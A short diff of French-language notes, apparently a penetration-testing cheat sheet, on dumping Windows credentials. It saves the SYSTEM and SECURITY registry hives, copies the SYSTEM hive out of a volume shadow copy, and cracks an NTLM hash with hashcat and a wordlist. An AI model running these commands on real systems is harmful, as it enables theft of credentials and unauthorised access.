@@ -11,13 +11,16 @@ reg save hklm\system system.save
 reg save hklm\security security.save
 ```
 
-Création d'
+Création d'un cliché instantané si besoin
+
 ```shell
 wmic shadowcopy call create Volume="C:\"
 ```
 
+Liste des clichés disponibles
+
 ```shell
-vssadmin.exe list shadows
+vssadmin.exe list shadows # Noter la ligne 'Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3'
 
 mkdir C:\temp
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\temp\SYSTEM
@@ -64,4 +67,5 @@ cat hash.txt
 31d6cfe0d16ae931b73c59d7e0c089c0
 ...
 
-sudo hashcat -m 1000 hash.txt /usr/share/wordlists/roc
+sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+```
